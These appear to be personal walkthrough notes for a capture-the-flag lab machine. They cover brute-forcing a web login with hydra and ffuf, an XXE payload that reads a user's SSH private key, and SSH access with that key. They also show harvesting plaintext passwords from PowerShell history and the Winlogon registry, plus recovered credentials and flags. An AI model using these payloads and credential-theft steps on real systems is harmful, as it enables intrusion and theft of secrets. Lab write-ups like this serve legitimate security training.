
```
10.129.95.192
```


# Brute force port 80 login with default username and passwords

```powershell
hydra -L ~/A/wordlists/top-usernames-shortlist.txt -P ~/A/wordlists/top-passwords-shortlist.txt 10.129.95.192 http-post-form "/:username=^USER^&password=^PASS^:Wrong Credentials" -V -t 2 -f

[80][http-post-form] host: 10.129.95.192   login: admin   password: password


# or save the login request into a file and use ffuf:

ffuf -c -request req_login -w ~/A/wordlists/top-passwords-shortlist.txt -fr "Wrong Credentials"

# -c : colorize
# -request: the copied http post request (change password to FUZZ in the saved file)
# -fr: filter based on regex 
```


# Creds:

```powershell
admin:password # bruteforced login page
```



# On the Order page:


We see a comment:


![[Pasted image 20251210142305.png]]


**DANIEL**  did something, he must have access. 



Submitting the order form and examining the input, we find it's vulnerable to XXE:


![[Pasted image 20251210142525.png]]


Attempt to get SSH key of Daniel:

```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "file:///c:/users/Daniel/.ssh/id_rsa">
]>

<order>
	<quantity>x</quantity>
		<item>&xxe;</item>
	<address>x</address><
/order>

```
![[Pasted image 20251210143831.png]]


Response from the server:

![[Pasted image 20251210143631.png]]

user
# SSH in


```powershell
# Save the key in id_rsa

#give it the right persmission
chmod 600 ir_rsa

# login
ssh Daniel@10.129.2.235 -i id_rsa
```



# Check the console file

```powershell

# check console history. 
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# In the powershell history:
$pass = ConvertTo-SecureString "YAkpPzX2V_%" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("daniel",$pass)
Start-Process -NoNewWindow -FilePath "C:\xampp\xampp_start.exe" -Credential $cred -WorkingDirectory c:\users\daniel\documents

$ Creds:

daniel:YAkpPzX2V_%
```

![[Pasted image 20251210173235.png]]

 Creds found in  in Autologon registery, winPeas detects it too: 

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Creds 
Administrator : Yhk}QE&j<3M
```



# Flags:

```powershell

# User:
032d2fc8952a8c24e39c8f0ee9918ef7

# Root:
f574a3e7650cebd8c39784299cb570f8
```